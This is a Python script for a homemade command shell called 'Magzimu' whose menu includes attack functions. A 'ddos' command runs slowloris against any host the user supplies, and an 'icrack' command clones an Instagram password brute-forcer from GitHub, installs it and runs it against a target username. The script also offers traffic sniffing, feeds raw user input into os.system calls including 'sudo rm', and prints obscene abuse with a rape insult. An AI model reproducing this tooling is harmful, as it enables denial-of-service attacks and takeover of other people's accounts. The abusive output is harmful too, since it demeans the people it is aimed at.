import os,sys,time,signal,threading,requests
try:
	os.system("clear")
	print("\033[1;34mWelcome To Magzimu 1.24 . Magzimu, a shell from hell. By BlackUnix\nWEBSITE: http://terminal.atspace.co.uk\t")
	time.sleep(3)
	def terline():
		dirc=print(os.getcwd())
		ask=input(str("\033[1;32mnoname:magzimu:blackunix:") + str(dirc) + str(":nomethod> "))
		if ask=="update":
			os.system("sudo apt update")
			terline()
		elif ask=="upgrade":
			os.system("sudo apt upgrade")
			terline()
		elif "print" in ask:
			js=print(ask.replace("print", "<MESSAGE>: "))
			terline()
		elif ask=="file -h":
			print("\033[1;35mMagzimu File Worker\nusing:\nfile -r FILE\tRemove a file\nfile -c\tfor create a magzimu file\nfile -c -n NAME -t\tcreate a Text File\nfile -c -n NAME --py\tmake python file\nfile -c -r NAME\tmake with your extension\n***BLACK UNIX MAGZIMU SHELL / BUMS File Table")
			terline()
		elif "file" in ask:
			if ask=="file":
				print("hm? file what? do \nfile -h\nError 19jfd+xcjd file without function")
				terline()
			elif ask=="file -h":
				print("\033[1;35mMagzimu File Worker\nusing:\nfile -r FILE\tRemove a file\nfile -c\tfor create a magzimu file\nfile -c -n NAME -t\tcreate a Text File\nfile -c -n NAME --py\tmake python file\nfile -c -r NAME\tmake with your extension\n***BLACK UNIX MAGZIMU SHELL / BUMS File Table")
				terline()
			elif ask=="file -r":
				print("\033[1;32mBro input a file for remove this command is not for gaming :|\nnow do \tfile -r YOURFILE")
				terline()
			elif "file -r " in ask:
				print("\033[1;31mDeleting...")
				os.system("sudo rm " + ask.replace("file -r ", ""))
				terline()
			elif ask=="file -c":
				print("do file -c NAME")
				terline()
			elif "file -c " in ask:
				print("Creating...")
				file=open(ask.replace("file -c ", "") + ".mag", "x")
				file.write("Hello. This is an magzimu file. BLACK UNIX")
				file.close()
				terline()
			elif ask=="file -c -n":
				print("Magzimu power file.By BlackUnix . doing file -c -n NAME -t or file -c -n NAME --py .\nBUMS")
				terline()
			elif "file -c -n " + " -t" in ask:
				print("Creaing...")
				openit=open(ask.replace("file -c -n ", "") + ask.replace(" -t", ""), "x")
				openit.write("Text file")
				openit.close()
				terline()
			elif "file -c -n " + " --py" in ask:
				print("creating...")
				print("error")
				terline()
			elif ask=="file -c -r":
				print("Magzimu Power File/Doing file -c -r NAME.EXTENSION")
				terline()
			elif "file -c -r " in ask:
				terline()
			else:
				print("Magzimu Power File Function " + ask + " Not found . please remove spaces or do file -h")
				terline()
		elif ask=="name":
			print("Magzimu name chooser . do name NAME")
			terline()
		elif "name " in ask:
			print("this option coming soon")
			terline()
		elif ask=="go":
			print("Magzimu Go . LIKE CD/doing go PATH")
			terline()
		elif "go " in ask:
			os.system("cd " + ask.replace("go ", ""))
			terline()
		elif ask=="exit":
			print("<>BLACKUNIX MAGZIMU SHELL EXITED BY USER.</>")
			exit()
		elif ask=="afk":
			print("Magzimu sleeper. do afk SECONDS")
			terline()
		elif "afk " in ask:
			print("Magzimu is in afk")
			time.sleep(int(ask.replace("afk ", "")))
			terline()
		elif "magzimu.mag" in ask:
			os.system("cat " + ask)
			terline()
		elif ask=="ha":
			print("List")
			os.system("ls")
			terline()
		elif "ha " in ask:
			print("List")
			os.system("ls " + ask.replace("ha ", ""))
			terline()
		elif ask=="source":
			print("\033[1;31mMagzimu Net Inspector MNI. Do source https://SITE.EXTENSION .")
			terline()
		elif "source " in ask:
			if ask.replace("source ", "")=="http://terminal.atspace.co.uk":
				print("WHY YOU WANT INSPECT MY SITE?")
				terline()
			else:
				print("Inspecting")
				jsa=requests.get(ask.replace("source ", ''))
				print(jsa)
				terline()
		elif ask=="ddos":
			print("Magzimu Super DDoSer. Do ddos HOST . And if you want ge host do host www.SITE.EXTENSION")
			terline()
		elif "ddos " in ask:
			if ask.replace("ddos ", "")=="185.82.212.199":
				print("I Dont trust you for ddosing my site http://terminal.atspace.co.uk")
				terline()
			else:
				print("DDOSING...")
				os.system("slowloris " + ask.replace("ddos", "") + " -p 443")
				terline()
		elif ask=="host":
			print("Magzimu Hyper Ping Host Stealer MHPHS. do host WWW.SITE.extension")
			terline()
		elif "host " in ask:
			print("Magzimu Hyper Ping Host Stealer Start working...")
			time.sleep(2)
			os.system("ping " + ask.replace("host ", ""))
			terline()
		elif "clear" in ask:
			print("OOW")
			os.system("clear")
			terline()
		elif ask=="icrack":
			print("Magzimu Instagram Cracker.")
			if os.path.exists("Instagram"):
				user=input("Your Target Username: ")
				passwd=input("Your Password List(Should in Instagram file here): ")
				print("Cracking")
				os.system("python3 Instagram/instagram.py " + user + passwd)
				terline()
			else:
				print("Instagram Cracker Not installed here.Do icrack -i for install or do icrack -i -r for install and run")
				terline()
		elif ask=="icrack -i":
			sjss=input("can you trust me install Instagram cracker?(y/n): ")
			if sjss=="y":
				print("Installing Instagram Master from github...")
				os.system("git clone https://github.com/Pure-L0G1C/Instagram")
				time.sleep(3)
				print("Getting Ready")
				time.sleep(2)
				os.system("cd Instagram")
				time.sleep(1)
				os.system("pip install -r requirements.txt")
				terline()
			else:
				print("why? :|")
				terline()
		elif ask=="icrack -i -r":
			sjss=input("can you trust me install Instagram cracker?(y/n): ")
			if sjss=="y":
				print("Installing Instagram Master from github...")
				os.system("git clone https://github.com/Pure-L0G1C/Instagram")
				time.sleep(3)
				print("Getting Ready")
				time.sleep(2)
				os.system("cd Instagram")
				time.sleep(1)
				os.system("pip install -r requirements.txt")
				print("Ready")
				time.sleep(2)
				user=input("Your Target Username: ")
				passwd=input("Your Password List(Should in Instagram file here): ")
				print("Cracking")
				os.system("python3 Instagram/instagram.py " + user + passwd)
				terline()
			else:
				print("why? :|")
				terline()
		elif "sniff" in ask:
			os.system("darkstat")
			terline()
		elif "myip" in ask:
			os.system("ifconfig")
			terline()
		elif "suggest" in ask:
			os.system("\033[1;32mNO SUGGESTS YET :|")
			terline()
		elif ask=="app":
			print("Magzimu easy Apt Package Process(APP) . do app -i PACKAGE for install and use apt easier. For See Example Packages do app -p")
			terline()
		elif ask=="app -i":
			print("Bro you write this command true but write a package i.e app -i joe ")
			terline()
		elif ask=="app ":
			print("Dont Make space in your commands.Magzimu cant read commands with spaces")
			terline()
		elif "app -i " in ask:
			os.system("sudo apt install " + ask.replace("app -i ", ""))
			terline()
		elif "app -h" in ask:
			print("\033[0;36mMagzimu Apt Package Process (MAPP, APP). i suggest you install this packages for developers:\napp -i snap\napp -i git\napp -i wine\napp -i joe\napp -i php\napp -i npm\nMagzimu . a shell from hell By BlackUnix. apt install PACKAGE => app -i PACKAGE")
			terline()
		elif "web" in ask:
			os.system("firefox")
			terline()
		elif "fuck you" in ask:
			if ask=="fuck you -h":
				print("Magzimu Folder Manager Fu** You . Do \nfuck you -c NAME \tCreate folder\nfuck you -r PATH\tRemove Folder\nfuck you -rn OLDNAME NEWNAME\nMagzimu Shell .Developed By BlackUnix")
				terline()
			elif "fuck you -c " in ask:
				print("DONE")
				os.system("mkdir " + ask.replace("fuck you -c ", ""))
				terline()
			elif "fuck you -r " in ask:
				print("DONE")
				os.system("rmdir " + ask.replace("fuck you -r ", ""))
				terline()
			elif "fuck you -rn " in ask:
				print("This option not working")
				terline()
			else:
				print("1.do fuck you -h for see help 2.if you want tell this word careful im angry:|")
				terline()
		elif "fucking you magzimu" in ask:
			print("Fuck you bitch mother fucker asshole . you mom was raped by BlackUnix . bitch .asshole .mother fucker . Fuck out")
			exit()
		elif "test" in ask:
			print("OK THEN? :|")
			terline()
		else:
			print(ask + " is no magzimu.mag File or no commands.Sys error " + str(hash(ask)))
			terline()
	terline()

except KeyboardInterrupt:
	os.system("clear")
	print("TURNING OFF ROBOT & BOTENT &  SHELL.")
	time.sleep(3)
	print("\nMAGZIMU SHELL BY BLACKUNIX . <>EXITED<> . reason: CTRL+C pressed")
	exit()